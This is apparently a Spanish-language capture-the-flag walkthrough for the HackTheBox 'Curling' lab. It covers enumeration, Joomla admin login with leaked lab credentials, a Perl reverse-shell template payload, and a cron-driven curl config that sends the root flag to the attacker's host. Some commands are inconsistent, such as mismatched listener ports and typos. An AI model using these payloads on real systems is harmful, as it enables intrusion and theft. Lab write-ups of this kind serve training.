## HTB-Curling
- Maquina: **Linux**
- Level: **Easy**
- IP: **10.10.10.150**

## Herramientas a utilizar:
- nmap
- wfuzz
- curl
- bzip2
- zcat
- nc

#### Fase 1: Enumeracion
```
nmap -sC -sV -o scan_curling.txt 10.10.10.150
```

Aqui encontraremos los siguientes puertos:
|PORT|SERVICE|VERSION|
|---|---|---|
|22| SSH OpenSSH| 7.6p1 Ubuntu 4
|80| HTTP Apache| httpd 2.4.29

Ahora haremos un reconocimiento a nivel web con `wfuzz`
```
wfuzz -c -w /usr/share/dirb/wordlists/common.txt -z list,-.php-.html-.txt --hc 404,403 http://10.10.10.150/FUZZFUZ2Z
```

Entre la busqueda podemos notar que encontramos

http://10.10.10.150/administrator/ **Este el cpanel de joolam**
Tambien encontramos:
http://10.10.10.150/**secret.txt**
Este archivo contiene la siguiente clave de acceso `Q3VybGluZzIwMTgh`

Esta se encuentra encryptada en base64 por lo que debemos crackear.
```
echo Q3VybGluZzIwMTgh | base64 -d
```
Y Ahora tenemos la credenciales `Curling2018!`

Volvemo a `http://10.10.10.150/` Veremos que el primer post dice que fue **Floris** y en este se encuentra casi igualita la credenciales que acabamos de encontrar. 🤣

Por lo que intentaremos utilizar el **user: floris pass: Curling2018!** en la siguiente direccion 
```
http://10.10.10.150/administrator/
```

Ahora iremos a **Extensions -> Templates -> Templates** aqui utilizaremos el primer Template y sustituimos por:
```
perl -e ‘use Socket;$i=”10.0.14.14″;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’
```
Grabamos,  Luego nos ponemos en modo escucha por el puerto 44444
```
nc -nlvp 44444
```
Volvemos a la web y ejecutamos `Template Preview` y listo tenemos nuestra shell
Para migrarla a una shell interativa haremos lo siguiente pasos.
```
python3 -c "import pty;pty.spawn('/bin/bash')"
Crtl-Z
stty raw -echo
reset
fg
export TERM=screen
Ahora debemos buscar cual es ancho de nuestra terminal
stty size
Volvemos a nuestra shell y ejecutamos
stty rows 27 cols 90
```

En `cd /home/floris` aqui encontraremos `user.txt` y `password_backup`
Como no podemos abrir `user.txt`, copiaremos `password_backup` en /tmp/
```
cp password_backup /tmp/.
```
Nos movemos a tmp
```
cd /tmp/
cat password_backup |xxd-r > password.xxd
```
Verificamos el tipo de archivo:
```
file password.xdd 
```
```
bzip2 -d password.xxd > password
zcat password.bzip2.out <enter>
zcat password.bzip2.out | bzcat <enter>
zcat password.bzip2.out | bzcat | tar -xO <enter> 
5d<wdCbdZu)|hChXll
```

Con estas credenciales podemos iniciar session en curling via ssh con **user: floris pass: 5d<wdCbdZu)|hChXll**
```
ssh floris@10.10.10.150
```
Aqui ya tendriamos la Flag del user

Ahora nos moveremos al directorio llamada `admin-data` y vermos dos archivo **input**, **report**.
si nos fijamos en la fecha de crecion de los archivo, notaran que ambos cambian cada un minuto, lo que significa que existe un crontab.

Verificamos si estos archivo se estan cambiando con alguna tarea programada con el usuario `floris`
```
crontab -e 
```
Pero para simplicar las cosas. lo que tendremos que hacer es lo siguiente
###### Paso 1 
Nos ponemos en escucha por el puerto `80`
```
nc -nlvpn 80
```
###### Paso 2
Desde Curling creamos el siguiente archivo, con nuesta ip de la vpn-htb en mi caso fue `10.10.14.16`
```
vi input
url = "http://10.10.14.16"
data="@/root/root.txt"
```
###### Paso 3
Volvemos a conectarnos a Curling via ssh 
```
root@10.10.10.150
```

Y listo deberiamos tener la flag del root.